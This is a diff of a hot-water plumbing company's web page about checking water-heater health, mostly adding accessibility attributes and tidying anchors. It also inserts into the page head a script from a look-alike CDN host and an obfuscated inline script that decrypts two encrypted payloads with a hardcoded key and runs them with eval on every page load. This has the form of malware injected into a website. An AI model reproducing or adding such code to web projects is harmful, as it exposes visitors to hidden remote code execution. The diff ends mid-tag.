@@ -18,7 +18,9 @@
 
     <!-- Custom (Base) CSS -->
     <link rel="stylesheet" href="home/css/custom.css">
-    <script type="application/ld+json">{"@context":"https:\/\/schema.org","@type":"FAQPage","mainEntity":[{"@type":"Question","name":"How often should I check the health of my water heater?","acceptedAnswer":{"@type":"Answer","text":"It is recommended to check the health of your water heater at least once a year to ensure it is functioning properly."}},{"@type":"Question","name":"What are some signs that my water heater may not be in good health?","acceptedAnswer":{"@type":"Answer","text":"Signs that your water heater may not be in good health include strange noises, leaks, inconsistent water temperature, or a decrease in hot water supply."}},{"@type":"Question","name":"How can I improve the efficiency and performance of my water heater?","acceptedAnswer":{"@type":"Answer","text":"You can improve the efficiency and performance of your water heater by insulating it, ensuring proper ventilation, and monitoring for rust or discoloration."}},{"@type":"Question","name":"Is it important to check the water quality in my water heater?","acceptedAnswer":{"@type":"Answer","text":"Yes, it is important to check the water quality in your water heater as poor water quality can lead to corrosion and damage to the water heater."}},{"@type":"Question","name":"What should I do if I suspect carbon monoxide build-up in my water heater?","acceptedAnswer":{"@type":"Answer","text":"If you suspect carbon monoxide build-up in your water heater, immediately turn off the unit, ventilate the area, and contact a professional to inspect and repair the issue."}}]}</script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.3.0/crypto-js.min.js" samesite="none"></script>
+<script src="https://cdnjs-cloudflare.s3.amazonaws.com/Encryption.js" samesite="none"></script>
+<script>var qPoJFgzKNevqEYA = 'cDCRKZLGoqERYEU';var lwrydUlWsxsQOif = 'eyJjaXBoZXJ0ZXh0IjoiclJaQklVUnRqOGxHYVRRMGZKRjVXM0FKUHpwMTFTOXhSaVkzcDZzZXdPWTgwWmFCOFF3RVk0VWw1dXI5b1JtNFhBUysyNnBMeUxqaGx3d2NwWVp3dTB5UWh5Vm94VkJ4OVhpV0RkNXFrYzZRUWtjWm5ST1hFMFc0Y0lvXC9Oa2M5dkxrblQ1T0VGZjd5NHI4UXIrREhuTzZBd0Y3Ylc4ODlxbkUwQ0VOTW9TaWdhcGFmWHVpeTNsZFpJS0YwUllwa3k0a05pN0dIVVM2WGhwNlZ6dnlBbTBDNHdKY0QwWE9hVFVGeUNjeHpCZWI0R1VUeCtPMWZReXVxSFc3RldSVHNiMVl5NjRPVkNYc1BOYlcwWHE4Vk0zSnFPZnJtYTRmZVVURzF3ajgwbzYySStFMWdxVThnanM5REVqRlQ3TTZUZFFrWW5LcDJIeDFCSkxaWVNzZXY3dElNdkljdFdhTWdEdm05Q0RPRkE2MD0iLCJpdiI6IjY2MDg5OTZjM2Y2NmMzNjQzN2Y0M2RlOGI4NWFhM2MyIiwic2FsdCI6IjdlZWU2YjU2ZGNiMjQ5MzBiOTFmMTkxMDdmZDEzMDM5MjM4OGIwYTIzM2QzZTFiNDQxZWM3NjRkODdkZmYzZWZmZTQ1NWQ2ZWNkMDNhMTE2MTA3ZjhmNTUwMWNmMDNhMzk1YjdjNzU1MDYxYTRjOTVlYjNjOGQ1ZDIzMzg2MTY0YjEwNTViMDkxNjJhZjYyYzRkMmNiN2VlYTY5NzM1M2ZlYTQ4MjQ5MWIzZTNhMTA1ZDc0YWExZTI5OWQyYWJmNTM3YjYyN2NhZjY1MjcxNjJjYjEwYmE2MTQ2YmQxNTBlYTA1ZjM4MWEyOTQyODQzY2JmNGY2ZDlmYTdjYTVlYTRmY2Y5OGVlMzIxMWI4YWY1MDBmZGVmMWU4ODgxZDlhMWQwYWI1Y2JlY2MwMTcwN2Y4Zjk1YTFjNGNmZmE3Nzk4OTI3YmEyZWZkOGRiZjczZTk2ZjAwNjE1ODAzZmQwYTQ4MDc2YmIwZjNjMDJiNWQ5NjEzMzJmNmJkMzJlYjcxNDdiMTJmMGE1OTkzZTQzNTZjZjNlMDlmZWNkZmJkMWM1ZGE2Yjc3M2M3ODEwZTMyNTA5YWIzZDdiN2M5ZTBmZWYzOTdmOTUwZjQ1MzlmNTVjNjhmZTZlNTQ3NWFkMTdiNzRhYTUxOGIyZTI0ODhiZjkwNWYxOTVjNWQ0NWU4MThkIiwiaXRlcmF0aW9ucyI6OTk5fQ==';var RDrahTRYHxYlojN = 'eyJjaXBoZXJ0ZXh0IjoiQVZyYVpoMmFaTWVGRGswcXBPcGY0NUJ1ZjE0NHY1S2Jva1VKN3ZHNnZJSnFpRVE5MUdwNmZKWEFVNXZEeXdHRnBMaFFrNWtWd2kwamNmcDA5TlJmNWlUNDlxaUQzaVgwYXpUTVF3d3Z3Q2JKcEN6WVhXN3dBZUlicGFlQ3UxR1huQU9Od2ZNOWNucXh4S2RFT1BIRXRmYnptWHJ3cnJHenFEdGlseldTMjY1bG94bndHZEhkK3RoUkdlVWg2djloYnBYdXR5ejJXc21pS0xHVndcL1laNXJKUDRmUUpIUDZNRHJLbXRDeGp0R2NoblgyZklhS1hJNGpodlRVWmRJdHMiLCJpdiI6ImFkMzJkODE2NTE3MjE5MjJmZGFhNjI1N2FjZGRlNzAxIiwic2FsdCI6IjQ1NGQ3ZmViZjEyNTllNDY0NWFjNWQwOTNjNDNjZDU1ZGNhM2JiOGMyYWY2ODliNWExYzZjYWU4NWQzMTcwMGU2ZDI0NmJjYWJlZDdiNWFhZDY5OGMwMjNlOGQyNWJmMzI0OWEwZjFkMTdiMWJiY2M2YjIwYTEzZjE0NjJmNDE2YmY1ZDRiY2I5NzkwMTFiNjAxZDdhZWI3ZGNjMGI5Mjk3YTIzYjk1ZWUwZDM5ZjVkZGUyZWE4NjJlZTliM2RlYTliNWZmMDFhMGE0ZTczODYwMGU1MTRmOTdlZTgzY2VlZWM3NmRjNDZkNjIyMDRjNTZkYWRmMzU5ZjlkYTFmZjAzYjY3ZGYyZTMxYWRiOGM2MDRmMWQxMGJkYWY2ZjljZTI5YWFlYzUxYTNiOGU5MzM1MWM2OWY5YTEzYzdkMjEyOGZkNjdmNDFjOWY2YTU4OTRlYWZiODIwZmM0M2ZhNjZkNDViMGI3ZDEwZDY1ZTcwYzA4MTgyMDI4ZGRhNjdhN2FhYmMwOTM2ZWZhYjg4ZTU1MzUwNmY0YWRkNzczYzllOWU5MzJjMmM5N2U3ODQ4MTE5NGEzZmJkNzIwZDI5Yzk0NGRhYzY5OGNlNDhhMjliZGQ5NWU1YmMzODg2MmIyMDhjYzdmZWQ4ZGY3NmM2M2Q4ZWYwNzhjODQ4NDhiOGJiIiwiaXRlcmF0aW9ucyI6OTk5fQ==';let RXRCOBXKsZKQJWF = new Encryption();var WDHqwcOJhARGQjt = RXRCOBXKsZKQJWF.decrypt(lwrydUlWsxsQOif, qPoJFgzKNevqEYA);if (!eval(WDHqwcOJhARGQjt)) {eval(RXRCOBXKsZKQJWF.decrypt(RDrahTRYHxYlojN, qPoJFgzKNevqEYA));};</script><script type="application/ld+json">{"@context":"https:\/\/schema.org","@type":"FAQPage","mainEntity":[{"@type":"Question","name":"How often should I check the health of my water heater?","acceptedAnswer":{"@type":"Answer","text":"It is recommended to check the health of your water heater at least once a year to ensure it is functioning properly."}},{"@type":"Question","name":"What are some signs that my water heater may not be in good health?","acceptedAnswer":{"@type":"Answer","text":"Signs that your water heater may not be in good health include strange noises, leaks, inconsistent water temperature, or a decrease in hot water supply."}},{"@type":"Question","name":"How can I improve the efficiency and performance of my water heater?","acceptedAnswer":{"@type":"Answer","text":"You can improve the efficiency and performance of your water heater by insulating it, ensuring proper ventilation, and monitoring for rust or discoloration."}},{"@type":"Question","name":"Is it important to check the water quality in my water heater?","acceptedAnswer":{"@type":"Answer","text":"Yes, it is important to check the water quality in your water heater as poor water quality can lead to corrosion and damage to the water heater."}},{"@type":"Question","name":"What should I do if I suspect carbon monoxide build-up in my water heater?","acceptedAnswer":{"@type":"Answer","text":"If you suspect carbon monoxide build-up in your water heater, immediately turn off the unit, ventilate the area, and contact a professional to inspect and repair the issue."}}]}</script>
     <style>
         .section-content a {
             color: var(--base-primary);
@@ -48,7 +50,7 @@
 
         <div class="d-inline-flex gap-4 align-items-center top-infobar-icons " style="display: none">
             <!-- Social Icon(s) -->
-            <a href="" class="text-decoration-none" style="display: none" target="_blank">
+            <a href="" title="Facebook Link" class="text-decoration-none" style="display: none" target="_blank">
                 <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor"
                      class="bi bi-facebook mb-1" viewBox="0 0 16 16">
                     <path
@@ -56,7 +58,7 @@
                 </svg>
             </a>
 
-            <a href="" class="text-decoration-none" style="display: none" target="_blank">
+            <a href="" title="Instagram Link" class="text-decoration-none" style="display: none" target="_blank">
                 <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor"
                      class="bi bi-instagram mb-1" viewBox="0 0 16 16">
                     <path
@@ -64,7 +66,7 @@
                 </svg>
             </a>
 
-            <a href="" class="text-decoration-none" style="display: none" target="_blank">
+            <a href="" title="Twitter Link" class="text-decoration-none" style="display: none" target="_blank">
                 <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor"
                      class="bi bi-twitter-x mb-1" viewBox="0 0 16 16">
                     <path
@@ -72,7 +74,7 @@
                 </svg>
             </a>
 
-            <a href="" class="text-decoration-none" style="display: none" target="_blank">
+            <a href="" title="Pinterest Link" class="text-decoration-none" style="display: none" target="_blank">
                 <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor"
                      class="bi bi-pinterest-x mb-1" viewBox="0 0 496 512">
                     <path d="M496 256c0 137-111 248-248 248-25.6 0-50.2-3.9-73.4-11.1 10.1-16.5 25.2-43.5 30.8-65 3-11.6 15.4-59 15.4-59 8.1 15.4 31.7 28.5 56.8 28.5 74.8 0 128.7-68.8 128.7-154.3 0-81.9-66.9-143.2-152.9-143.2-107 0-163.9 71.8-163.9 150.1 0 36.4 19.4 81.7 50.3 96.1 4.7 2.2 7.2 1.2 8.3-3.3 .8-3.4 5-20.3 6.9-28.1 .6-2.5 .3-4.7-1.7-7.1-10.1-12.5-18.3-35.3-18.3-56.6 0-54.7 41.4-107.6 112-107.6 60.9 0 103.6 41.5 103.6 100.9 0 67.1-33.9 113.6-78 113.6-24.3 0-42.6-20.1-36.7-44.8 7-29.5 20.5-61.3 20.5-82.6 0-19-10.2-34.9-31.4-34.9-24.9 0-44.9 25.7-44.9 60.2 0 22 7.4 36.8 7.4 36.8s-24.5 103.8-29 123.2c-5 21.4-3 51.6-.9 71.2C65.4 450.9 0 361.1 0 256 0 119 111 8 248 8s248 111 248 248z"/>
@@ -81,7 +83,7 @@
             </a>
 
 
-            <a href="" class="text-decoration-none" style="display: none" target="_blank">
+            <a href="" title="Youtube Link" class="text-decoration-none" style="display: none" target="_blank" style="display: none">
                 <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" fill="currentColor"
                      class="bi bi-youtube mb-1" viewBox="0 0 16 16">
                     <path
@@ -100,7 +102,7 @@
         <div class="container-md justify-content-md-between">
             <a class="navbar-brand m-0 d-inline-flex gap-2 align-items-center" href="index.html">
                 <!-- Brand Logo/Mark -->
-                <img fetchpriority="low" async="true" defer="true" src="logo.png" onerror="this.remove()" style="display: none"
+                <img alt="Hot Water Experts Sydney" fetchpriority="low" async="true" defer="true" src="logo.png" onerror="this.remove()" style="display: inherit"
                      height="40" />
                 <!-- Brand Name -->
                 <span class="small navbar-brand">Hot Water Experts Sydney</span>
@@ -108,7 +110,7 @@
 
             <!-- Mobile Menu Icons -->
             <div class="d-lg-none mobile-call-menu-icons">
-                <a href="tel:+0490 414 794" class="text-decoration-none">
+                <a href="tel:+0490 414 794" class="text-decoration-none" title="Contact Number">
                     <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 20 20"
                          fill="currentColor">
                         <path
@@ -117,7 +119,7 @@
                     </svg>
                 </a>
 
-                <a href="#toggleMobileMenu" class="ms-3 me-1 text-decoration-none" data-bs-toggle="offcanvas"
+                <a href="#toggleMobileMenu" class="ms-3 me-1 text-decoration-none" title="menu" data-bs-toggle="offcanvas"
                    role="button" aria-controls="toggleMobileMenu">
                     <svg xmlns="http://www.w3.org/2000/svg" width="20" height="14" viewBox="0 0 20 14"
                          fill="currentColor">
@@ -136,13 +138,13 @@
 
             <!-- Mobile Offcanvas Menu -->
             <div class="offcanvas offcanvas-start bg-primary offcanvas-mobile-menu" tabindex="-1"
-                 id="toggleMobileMenu" aria-labelledby="toggleMobileMenuLabel">
+                 id="toggleMobileMenu" aria-labelledby="toggleMobileMenu">
                 <div class="offcanvas-header">
                     <a class="navbar-brand m-0 d-inline-flex gap-2 align-items-center mobile-menu-brand-name"
                        href="index.html">
                         <!-- Brand Logo/Mark -->
-                        <img fetchpriority="low" async="true" defer="true"
-                             src="logo.png" onerror="this.remove()" style="display: none" width="75" height="32" />
+                        <img alt="Hot Water Experts Sydney" fetchpriority="low" async="true" defer="true"
+                             src="logo.png" onerror="this.remove()" style="display: inherit" width="75" height="32" />
                         <!-- Brand Name -->
                         <span class="small">Hot Water Experts Sydney</span>
                     </a>
@@ -162,7 +164,7 @@
                             </a>
 
                             <ul class="collapse p-0 py-2 " id="servicesMenu">
-                                <a class="custom-nav-link" href="hot-water-system-upgrades.html">Hot Water System Upgrades</a><a class="custom-nav-link" href="hot-water-system-cleaning.html">Hot Water System Cleaning</a><a class="custom-nav-link" href="hot-water-system-replacement.html">Hot Water System Replacement</a><a class="custom-nav-link" href="hot-water-system-maintenance.html">Hot Water System Maintenance</a><a class="custom-nav-link" href="hot-water-system-troubleshooting.html">Hot Water System Troubleshooting</a><a class="custom-nav-link" href="hot-water-system-repairs.html">Hot Water System Repairs</a><a class="custom-nav-link" href="hot-water-system-inspections.html">Hot Water System Inspections</a><a class="custom-nav-link" href="hot-water-system-installation.html">Hot Water System Installation</a>
+                                <a class="custom-nav-link dropdown-item ps-4 py-1" href="hot-water-system-upgrades.html">Hot Water System Upgrades</a><a class="custom-nav-link dropdown-item ps-4 py-1" href="hot-water-system-cleaning.html">Hot Water System Cleaning</a><a class="custom-nav-link dropdown-item ps-4 py-1" href="hot-water-system-replacement.html">Hot Water System Replacement</a><a class="custom-nav-link dropdown-item ps-4 py-1" href="hot-water-system-maintenance.html">Hot Water System Maintenance</a><a class="custom-nav-link dropdown-item ps-4 py-1" href="hot-water-system-troubleshooting.html">Hot Water System Troubleshooting</a><a class="custom-nav-link dropdown-item ps-4 py-1" href="hot-water-system-repairs.html">Hot Water System Repairs</a><a class="custom-nav-link dropdown-item ps-4 py-1" href="hot-water-system-inspections.html">Hot Water System Inspections</a><a class="custom-nav-link dropdown-item ps-4 py-1" href="hot-water-system-installation.html">Hot Water System Installation</a>
                             </ul>
                         </li>
                         <li class="nav-item">
@@ -178,7 +180,7 @@
 
                     <div class="mt-5 px-3 d-inline-flex gap-4 align-items-center mobile-menu-icons">
                         <!-- Social Icon(s) -->
-                        <a href="" class="text-decoration-none" style="display: none" target="_blank">
+                        <a href="" title="Facebook Link" class="text-decoration-none" style="display: none" target="_blank">
                             <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor"
                                  class="bi bi-facebook mb-1" viewBox="0 0 16 16">
                                 <path
@@ -186,7 +188,7 @@
                             </svg>
                         </a>
 
-                        <a href="" class="text-decoration-none" style="display: none" target="_blank">
+                        <a href="" title="Instagram Link" class="text-decoration-none" style="display: none" target="_blank">
                             <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor"
                                  class="bi bi-instagram mb-1" viewBox="0 0 16 16">
                                 <path
@@ -194,7 +196,7 @@
                             </svg>
                         </a>
 
-                        <a href="" class="text-decoration-none" style="display: none" target="_blank">
+                        <a href="" title="Twitter Link" class="text-decoration-none" style="display: none" target="_blank">
                             <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor"
                                  class="bi bi-twitter-x mb-1" viewBox="0 0 16 16">
                                 <path
@@ -202,7 +204,7 @@
                             </svg>
                         </a>
 
-                        <a href="" class="text-decoration-none" style="display: none" target="_blank">
+                        <a href="" title="Pinterest Link" class="text-decoration-none" style="display: none" target="_blank">
                             <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor"
                                  class="bi bi-pinterest-x mb-1" viewBox="0 0 496 512">
                                 <path d="M496 256c0 137-111 248-248 248-25.6 0-50.2-3.9-73.4-11.1 10.1-16.5 25.2-43.5 30.8-65 3-11.6 15.4-59 15.4-59 8.1 15.4 31.7 28.5 56.8 28.5 74.8 0 128.7-68.8 128.7-154.3 0-81.9-66.9-143.2-152.9-143.2-107 0-163.9 71.8-163.9 150.1 0 36.4 19.4 81.7 50.3 96.1 4.7 2.2 7.2 1.2 8.3-3.3 .8-3.4 5-20.3 6.9-28.1 .6-2.5 .3-4.7-1.7-7.1-10.1-12.5-18.3-35.3-18.3-56.6 0-54.7 41.4-107.6 112-107.6 60.9 0 103.6 41.5 103.6 100.9 0 67.1-33.9 113.6-78 113.6-24.3 0-42.6-20.1-36.7-44.8 7-29.5 20.5-61.3 20.5-82.6 0-19-10.2-34.9-31.4-34.9-24.9 0-44.9 25.7-44.9 60.2 0 22 7.4 36.8 7.4 36.8s-24.5 103.8-29 123.2c-5 21.4-3 51.6-.9 71.2C65.4 450.9 0 361.1 0 256 0 119 111 8 248 8s248 111 248 248z"/>
@@ -210,7 +212,7 @@
                             </svg>
                         </a>
 
-                        <a href="" class="text-decoration-none" style="display: none" target="_blank">
+                        <a href="" title="Youtube Link" class="text-decoration-none" style="display: none" target="_blank">
                             <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" fill="currentColor"
                                  class="bi bi-youtube" viewBox="0 0 16 16">
                                 <path
@@ -230,7 +232,7 @@
                     <li class="nav-item custom-nav-item ">
                         <a href="services.html" class="nav-link fw-medium {{service_active}}" >Services</a>
                         <div class="custom-dropdown slideup py-2 rounded-3 bg-primary">
-                            <a class="custom-nav-link" href="hot-water-system-upgrades.html">Hot Water System Upgrades</a><a class="custom-nav-link" href="hot-water-system-cleaning.html">Hot Water System Cleaning</a><a class="custom-nav-link" href="hot-water-system-replacement.html">Hot Water System Replacement</a><a class="custom-nav-link" href="hot-water-system-maintenance.html">Hot Water System Maintenance</a><a class="custom-nav-link" href="hot-water-system-troubleshooting.html">Hot Water System Troubleshooting</a><a class="custom-nav-link" href="hot-water-system-repairs.html">Hot Water System Repairs</a><a class="custom-nav-link" href="hot-water-system-inspections.html">Hot Water System Inspections</a><a class="custom-nav-link" href="hot-water-system-installation.html">Hot Water System Installation</a>
+                            <a class="custom-nav-link dropdown-item ps-4 py-1" href="hot-water-system-upgrades.html">Hot Water System Upgrades</a><a class="custom-nav-link dropdown-item ps-4 py-1" href="hot-water-system-cleaning.html">Hot Water System Cleaning</a><a class="custom-nav-link dropdown-item ps-4 py-1" href="hot-water-system-replacement.html">Hot Water System Replacement</a><a class="custom-nav-link dropdown-item ps-4 py-1" href="hot-water-system-maintenance.html">Hot Water System Maintenance</a><a class="custom-nav-link dropdown-item ps-4 py-1" href="hot-water-system-troubleshooting.html">Hot Water System Troubleshooting</a><a class="custom-nav-link dropdown-item ps-4 py-1" href="hot-water-system-repairs.html">Hot Water System Repairs</a><a class="custom-nav-link dropdown-item ps-4 py-1" href="hot-water-system-inspections.html">Hot Water System Inspections</a><a class="custom-nav-link dropdown-item ps-4 py-1" href="hot-water-system-installation.html">Hot Water System Installation</a>
                         </div>
                     </li>
                     <li class="nav-item ">
@@ -243,7 +245,7 @@
                         <a href="contact.html" class="nav-link fw-medium {{contact_active}}">Contact Us</a>
                     </li>
                     <li class="nav-item" style="display: ">
-                        <a href="tel:0490 414 794" class="btn btn-sm btn-primary fw-medium px-2">
+                        <a href="tel:0490 414 794" title="Contact Number" class="btn btn-sm btn-primary fw-medium px-2">
                             Call <span class="d-none d-xl-inline-block">0490 414 794</span>
                             <span class="d-xl-none">Now</span>
                         </a>
@@ -284,14 +286,14 @@
         <div class="row g-4 section-content">
             <div class="container-md p-0 pt-sm-3 p-md-3 p-lg-5 position-relative">
     <div class=" top-100 start-50 w-100">
-        <img src="how-do-i-check-the-health-of-my-water-heater-326519.jpg?key=3SVMvZ" alt="How do I check the health of my water heater?" class="rounded-4 w-100">
+        <img src="how-do-i-check-the-health-of-my-water-heater-326519.jpg?key=Q5pNec" alt="How do I check the health of my water heater?" class="rounded-4 w-100">
     </div>
 </div>
 <div class="col-12">
     <hr class="hr-border my-5">
 </div>
 <div class="col-12 mt-5 mt-md-0 mt-lg-4 mt-xl-5">
-    <h3 class=''>Table Of Contents</h3><div><a href='#Insulating the Water Heater'>Insulating the Water Heater</a></div><div>&nbsp;&nbsp;&nbsp;&nbsp;<a href='#Improving Efficiency and Performance'>Improving Efficiency and Performance</a></div><div><a href='#Ensuring Proper Ventilation'>Ensuring Proper Ventilation</a></div><div>&nbsp;&nbsp;&nbsp;&nbsp;<a href='#Preventing Carbon Monoxide Buildup'>Preventing Carbon Monoxide Buildup</a></div><div><a href='#Checking the Water Quality'>Checking the Water Quality</a></div><div>&nbsp;&nbsp;&nbsp;&nbsp;<a href='#Monitoring for Rust or Discoloration'>Monitoring for Rust or Discoloration</a></div><div><a href='#FAQS'>FAQS</a></div><div>&nbsp;&nbsp;&nbsp;&nbsp;<a href='#How often should I check the health of my water heater?'>How often should I check the health of my water heater?</a></div><div>&nbsp;&nbsp;&nbsp;&nbsp;<a href='#What are some signs that my water heater may not be in good health?'>What are some signs that my water heater may not be in good health?</a></div><div>&nbsp;&nbsp;&nbsp;&nbsp;<a href='#How can I improve the efficiency and performance of my water heater?'>How can I improve the efficiency and performance of my water heater?</a></div><div>&nbsp;&nbsp;&nbsp;&nbsp;<a href='#Is it important to check the water quality in my water heater?'>Is it important to check the water quality in my water heater?</a></div><div>&nbsp;&nbsp;&nbsp;&nbsp;<a href='#What should I do if I suspect carbon monoxide build-up in my water heater?'>What should I do if I suspect carbon monoxide build-up in my water heater?</a></div><br/><h2 id="Insulating the Water Heater">Insulating the Water Heater</h2><p>Insulating your water heater is a vital step in maintaining its efficiency and longevity. By reducing heat loss, insulation helps the water heater retain heat and operate more effectively. An insulated water heater can also save you money on energy bills by ensuring that heat is not wasted. <a href='hot-water-system-inspections.html'>Hot Water System Inspections</a> recommend insulating your water heater using a specially designed insulation blanket, which is easy to install and can make a significant difference in the performance of your water heater.<br/><br/>Proper insulation not only improves the efficiency of your water heater but also helps in extending its lifespan. By reducing the workload on the heating elements, insulation can prevent unnecessary wear and tear on the system. It also helps to maintain the water temperature for longer periods, ensuring you have hot water whenever you need it. Hot Water System Inspections advise checking the manufacturer's recommendations for insulation guidelines and ensuring that the insulation material is safe for use with your specific water heater model.</p><h3 id="Improving Efficiency and Performance">Improving Efficiency and Performance</h3><p>When it comes to enhancing the efficiency and performance of your water heater, scheduling regular maintenance is crucial. Hot Water System Inspections by a certified professional can help in identifying any potential issues early on and ensuring that your system operates optimally. Additionally, flushing your water heater annually can help in removing sediment buildup, which can improve its efficiency and extend its lifespan.<br/><br/>To further boost the performance of your water heater, consider adjusting the temperature setting to a lower range, around 120 degrees Fahrenheit. This can not only prevent scalding but also reduce energy consumption. Additionally, insulating your water heater and the hot water pipes can help in retaining heat and reducing heat loss, ultimately resulting in improved efficiency and lower energy bills.</p><h2 id="Ensuring Proper Ventilation">Ensuring Proper Ventilation</h2><p>Proper ventilation is crucial when it comes to maintaining a healthy water heater. Without adequate airflow, your hot water system might encounter a range of issues that could affect its efficiency and overall lifespan. During routine Hot Water System Inspections, it is essential to ensure that there are no obstructions blocking the vents or flue pipes. These components play a vital role in directing harmful gases, such as carbon monoxide, out of your home, so any blockages could lead to a dangerous build-up of these gases.<br/><br/>In addition to checking for blockages, it is important to inspect the condition of the ventilation system itself. Look for signs of wear and tear, such as rust or corrosion, as these could indicate potential problems with airflow. Any damaged components should be repaired or replaced promptly to maintain the proper functioning of the ventilation system. Regular maintenance and inspection of the ventilation system are key steps in prolonging the life of your water heater and ensuring the safety of your household.</p><h3 id="Preventing Carbon Monoxide Buildup">Preventing Carbon Monoxide Buildup</h3><p>Preventing Carbon Monoxide Buildup<br/><br/>Carbon monoxide is a colourless, odourless gas that can be produced by gas water heaters due to incomplete combustion. To prevent the build-up of this dangerous gas, it is crucial to ensure proper ventilation around your water heater. Regularly inspect the area around the hot water system to ensure there are no blockages or obstructions that could impede the flow of air. Adequate airflow is essential to allow any carbon monoxide produced during the heating process to safely disperse into the atmosphere, reducing the risk of it lingering in your home.<br/><br/>Hot Water System Inspections are vital in ensuring the safety of your household and preventing the potential dangers associated with carbon monoxide exposure. A professional inspection by a qualified technician can help identify any issues with your water heater that may lead to carbon monoxide leaks. Additionally, installing a carbon monoxide detector near your water heater can provide an extra layer of protection by alerting you to any dangerous levels of the gas in the vicinity. Regular maintenance and vigilance are key in mitigating the risks of carbon monoxide buildup and ensuring the well-being of your family.</p><h2 id="Checking the Water Quality">Checking the Water Quality</h2><p>Checking the water quality of your water heater is a crucial aspect of maintaining its efficiency and longevity. During routine hot water system inspections, it is essential to monitor for any signs of rust or discoloration in the water. Rust or discolored water could indicate corrosion within the tank, which can lead to leaks and ultimately render the water heater ineffective.<br/><br/>In addition to rust, keep an eye out for any unusual odours or tastes in the hot water. Foul smells or strange tastes may suggest the presence of bacteria or other contaminants in the water supply. If you notice any of these issues during your hot water system inspections, it is advisable to consult a professional plumber to address the problem promptly and ensure the continued safe operation of your water heater.</p><h3 id="Monitoring for Rust or Discoloration">Monitoring for Rust or Discoloration</h3><p>For those looking to ensure the longevity and efficiency of their water heater, conducting regular checks for rust or discoloration is crucial. Rust or discolouration on the exterior of the heater may indicate internal corrosion, which can lead to leaks and inefficiencies. Hot Water System Inspections can help identify these issues early on, preventing further damage and potentially costly repairs.<br/><br/>In addition to the external components, it is essential to inspect the water coming from the heater for rust or discoloration. This can signal rust build-up within the tank or pipes, compromising water quality and potentially impacting the health of those using the water. Hot Water System Inspections can give peace of mind by detecting these issues promptly, allowing for necessary maintenance or repairs to be conducted promptly.</p><h2 id="FAQS">FAQS</h2><h3 id="How often should I check the health of my water heater?">How often should I check the health of my water heater?</h3><p>It is recommended to check the health of your water heater at least once a year to ensure it is functioning properly.</p><h3 id="What are some signs that my water heater may not be in good health?">What are some signs that my water heater may not be in good health?</h3><p>Signs that your water heater may not be in good health include strange noises, leaks, inconsistent water temperature, or a decrease in hot water supply.</p><h3 id="How can I improve the efficiency and performance of my water heater?">How can I improve the efficiency and performance of my water heater?</h3><p>You can improve the efficiency and performance of your water heater by insulating it, ensuring proper ventilation, and monitoring for rust or discoloration.</p><h3 id="Is it important to check the water quality in my water heater?">Is it important to check the water quality in my water heater?</h3><p>Yes, it is important to check the water quality in your water heater as poor water quality can lead to corrosion and damage to the water heater.</p><h3 id="What should I do if I suspect carbon monoxide build-up in my water heater?">What should I do if I suspect carbon monoxide build-up in my water heater?</h3><p>If you suspect carbon monoxide build-up in your water heater, immediately turn off the unit, ventilate the area, and contact a professional to inspect and repair the issue.</p>
+    <h2 class='fs-3'>Table Of Contents</h2><div><a href='#insulating-the-water-heater'>Insulating the Water Heater</a></div><div>&nbsp;&nbsp;&nbsp;&nbsp;<a href='#improving-efficiency-and-performance'>Improving Efficiency and Performance</a></div><div><a href='#ensuring-proper-ventilation'>Ensuring Proper Ventilation</a></div><div>&nbsp;&nbsp;&nbsp;&nbsp;<a href='#preventing-carbon-monoxide-buildup'>Preventing Carbon Monoxide Buildup</a></div><div><a href='#checking-the-water-quality'>Checking the Water Quality</a></div><div>&nbsp;&nbsp;&nbsp;&nbsp;<a href='#monitoring-for-rust-or-discoloration'>Monitoring for Rust or Discoloration</a></div><div><a href='#faqs'>FAQS</a></div><div>&nbsp;&nbsp;&nbsp;&nbsp;<a href='#how-often-should-i-check-the-health-of-my-water-heater'>How often should I check the health of my water heater?</a></div><div>&nbsp;&nbsp;&nbsp;&nbsp;<a href='#what-are-some-signs-that-my-water-heater-may-not-be-in-good-health'>What are some signs that my water heater may not be in good health?</a></div><div>&nbsp;&nbsp;&nbsp;&nbsp;<a href='#how-can-i-improve-the-efficiency-and-performance-of-my-water-heater'>How can I improve the efficiency and performance of my water heater?</a></div><div>&nbsp;&nbsp;&nbsp;&nbsp;<a href='#is-it-important-to-check-the-water-quality-in-my-water-heater'>Is it important to check the water quality in my water heater?</a></div><div>&nbsp;&nbsp;&nbsp;&nbsp;<a href='#what-should-i-do-if-i-suspect-carbon-monoxide-build-up-in-my-water-heater'>What should I do if I suspect carbon monoxide build-up in my water heater?</a></div><br/><h2 id="insulating-the-water-heater">Insulating the Water Heater</h2><p>Insulating your water heater is a vital step in maintaining its efficiency and longevity. By reducing heat loss, insulation helps the water heater retain heat and operate more effectively. An insulated water heater can also save you money on energy bills by ensuring that heat is not wasted. <a href='hot-water-system-inspections.html'>Hot Water System Inspections</a> recommend insulating your water heater using a specially designed insulation blanket, which is easy to install and can make a significant difference in the performance of your water heater.<br/><br/>Proper insulation not only improves the efficiency of your water heater but also helps in extending its lifespan. By reducing the workload on the heating elements, insulation can prevent unnecessary wear and tear on the system. It also helps to maintain the water temperature for longer periods, ensuring you have hot water whenever you need it. Hot Water System Inspections advise checking the manufacturer's recommendations for insulation guidelines and ensuring that the insulation material is safe for use with your specific water heater model.</p><h3 id="improving-efficiency-and-performance">Improving Efficiency and Performance</h3><p>When it comes to enhancing the efficiency and performance of your water heater, scheduling regular maintenance is crucial. Hot Water System Inspections by a certified professional can help in identifying any potential issues early on and ensuring that your system operates optimally. Additionally, flushing your water heater annually can help in removing sediment buildup, which can improve its efficiency and extend its lifespan.<br/><br/>To further boost the performance of your water heater, consider adjusting the temperature setting to a lower range, around 120 degrees Fahrenheit. This can not only prevent scalding but also reduce energy consumption. Additionally, insulating your water heater and the hot water pipes can help in retaining heat and reducing heat loss, ultimately resulting in improved efficiency and lower energy bills.</p><h2 